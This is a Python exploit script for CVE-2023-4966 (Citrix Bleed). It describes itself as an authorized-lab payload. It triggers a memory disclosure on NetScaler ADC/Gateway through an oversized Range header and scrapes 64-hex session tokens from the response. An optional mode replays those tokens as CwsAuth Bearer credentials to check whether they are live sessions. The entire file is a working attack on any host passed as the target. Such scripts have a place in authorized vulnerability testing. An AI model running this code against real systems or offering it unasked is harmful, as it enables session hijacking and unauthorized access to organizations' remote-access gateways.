#!/usr/bin/env python3
"""CVE-2023-4966 (Citrix Bleed) - authorized-lab deploy payload.

Leaks NetScaler ADC / Gateway session tokens via the path-traversal +
response-splitting memory disclosure on
/oauth/idp/../.well-known/openid-configuration with an oversized Range
header, extracts 64-hex-char session tokens, and optionally validates them
against /logonpoint using the CwsAuth Bearer scheme.
"""
import argparse
import json
import re
import sys

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

RANGE_VARIANTS = ["bytes=-200000", "bytes=0-196607"]
TOKEN_RE = re.compile(r"(?<![0-9a-f])[0-9a-f]{64}(?![0-9a-f])")


def leak_tokens(base, timeout):
    """Probe the disclosure with several known-good Range header variants."""
    attempts = []
    tokens = set()
    for rng in RANGE_VARIANTS:
        attempt = {"range_header": rng, "status": None, "bytes": 0, "tokens_found": 0, "error": None}
        attempts.append(attempt)
        try:
            r = requests.get(
                base + "/oauth/idp/../.well-known/openid-configuration",
                headers={"Range": rng},
                verify=False,
                timeout=timeout,
            )
            attempt["status"] = r.status_code
            attempt["bytes"] = len(r.content)
            found = set(TOKEN_RE.findall(r.text))
            attempt["tokens_found"] = len(found)
            tokens |= found
        except requests.exceptions.RequestException as exc:
            attempt["error"] = "%s: %s" % (type(exc).__name__, exc)
    return tokens, attempts


def validate_token(base, token, timeout):
    """Use a leaked token as CwsAuth Bearer against known logon endpoints."""
    out = {"token": token, "endpoints": []}
    valid = False
    for path in ("/logonpoint", "/logon/LogonPoint"):
        ep = {"path": path, "status": None, "valid": False, "error": None}
        out["endpoints"].append(ep)
        try:
            r = requests.get(
                base + path,
                headers={"Authorization": "CwsAuth BEARER %s" % token},
                verify=False,
                timeout=timeout,
                allow_redirects=False,
            )
            ep["status"] = r.status_code
            # An invalid/expired token bounces to the logon form (200 with
            # form HTML or 302); a live session returns the portal page.
            ep["valid"] = (
                r.status_code == 200
                and "login" not in r.text[:2000].lower()
                and "ns_win" in r.text.lower()
            )
            valid = valid or ep["valid"]
        except requests.exceptions.RequestException as exc:
            ep["error"] = "%s: %s" % (type(exc).__name__, exc)
    out["valid"] = valid
    return out


def run(args):
    base = "https://%s:%d" % (args.target, args.port)
    result = {
        "cve": "CVE-2023-4966",
        "target": base,
        "vulnerable": False,
        "verified_by": None,
        "leak_attempts": [],
        "leaked_tokens": [],
        "token_validation": [],
        "error": None,
    }
    try:
        tokens, attempts = leak_tokens(base, args.timeout)
        result["leak_attempts"] = attempts
        result["leaked_tokens"] = sorted(tokens)
        if tokens:
            result["vulnerable"] = True
            result["verified_by"] = "memory disclosure returned %d candidate 64-hex session token(s)" % len(tokens)
    except requests.exceptions.RequestException as exc:
        result["error"] = "%s: %s" % (type(exc).__name__, exc)
        return result

    if tokens and args.validate:
        for token in sorted(tokens)[: args.max_validate]:
            result["token_validation"].append(validate_token(base, token, args.timeout))
        if any(v["valid"] for v in result["token_validation"]):
            result["verified_by"] += "; at least one token validated as a live session (CwsAuth Bearer)"
    return result


def main():
    p = argparse.ArgumentParser(description="CVE-2023-4966 Citrix Bleed authorized-lab deploy")
    p.add_argument("--target", required=True)
    p.add_argument("--port", type=int, default=443)
    p.add_argument("--timeout", type=float, default=15.0)
    p.add_argument("--validate", action="store_true", help="validate leaked tokens as CwsAuth Bearer sessions")
    p.add_argument("--max-validate", type=int, default=5, help="max tokens to validate")
    args = p.parse_args()
    try:
        result = run(args)
    except Exception as exc:
        result = {"cve": "CVE-2023-4966", "target": "%s:%d" % (args.target, args.port),
                  "vulnerable": False, "error": "%s: %s" % (type(exc).__name__, exc)}
    print(json.dumps(result, indent=2))
    return 0 if result.get("vulnerable") else 1


if __name__ == "__main__":
    sys.exit(main())
